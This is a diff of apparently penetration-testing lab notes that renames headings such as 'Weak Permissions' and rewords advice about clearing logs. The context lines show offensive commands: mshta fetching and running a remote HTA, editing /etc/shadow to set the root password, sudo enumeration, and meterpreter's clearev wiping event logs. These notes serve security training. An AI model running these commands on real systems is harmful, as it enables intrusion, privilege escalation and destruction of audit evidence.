@@ -583,7 +583,7 @@ mshta.exe http://<ip>:<port>/<filename>.hta
 ```
 
 ### Linux Privilege Escalation
-#### Files With Weak Permissions
+#### Weak Permissions
 ```
 find / -not -type l -perm -o+w
 
@@ -604,7 +604,7 @@ Password: password
 ```
 - Modify `/etc/shadow` by setting root password.
 
-#### Sudo Privileges
+#### SUDO Privileges
 ```
 sudo -l
 User student may run the following commands on attackdefense:
@@ -889,7 +889,6 @@ SUCCESS: The process "vRMPV.exe" with PID 2824 has been terminated.
 resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc)> rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\vRMPV.exe"
 ```
 
-#### Cleaning Event Logs
 ```
 meterpreter > clearev
 
@@ -897,7 +896,7 @@ meterpreter > clearev
 [*] Wiping 759 records from System...
 [*] Wiping 2571 records from Security...
 ```
-- Avoid using this during an engagement.
+- Avoid clearing Windows Event logs during an engagement.
 
 #### Clearing Your Tracks On Linux
 ```
